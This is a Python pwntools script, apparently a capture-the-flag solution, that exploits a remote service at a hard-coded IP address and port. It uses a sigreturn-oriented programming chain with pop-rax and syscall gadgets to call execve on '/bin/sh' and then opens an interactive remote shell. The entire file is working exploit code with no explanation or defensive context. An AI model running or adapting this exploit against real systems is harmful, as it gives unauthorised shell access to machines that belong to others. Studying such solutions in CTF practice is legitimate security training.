#!/usr/bin/env python3
from pwn import *

# target
HOST = '83.136.252.13'
PORT = 35995

# gadget and data addresses (from the disassembly)
POP_RAX    = 0x43018      # pop rax; ret
SYSCALL    = 0x43015      # syscall; ret
BINSH_ADDR = 0x43238      # "/bin/sh" string in .rodata

def main():
    # choose context
    context.arch = 'amd64'
    context.os   = 'linux'

    # connect
    p = remote(HOST, PORT)

    # build sigreturn frame
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve    # 59 -> execve
    frame.rdi = BINSH_ADDR              # pointer to "/bin/sh"
    frame.rsi = 0                       # argv = NULL
    frame.rdx = 0                       # envp = NULL
    frame.rip = SYSCALL                 # return into syscall

    # prefix of 8 bytes to align into saved RIP slot
    prefix = b'w3th4nds'  # exactly 8 bytes

    # SROP trigger: 
    #   1) pop rax; ret
    #   2) value 0xF (SYS_rt_sigreturn)
    #   3) syscall (executes sigreturn)
    #   4) raw frame
    payload  = prefix
    payload += p64(POP_RAX)
    payload += p64(0xF)
    payload += p64(SYSCALL)
    payload += bytes(frame)

    # send and drop to interactive shell
    p.send(payload)
    p.interactive()

if __name__ == '__main__':
    main()
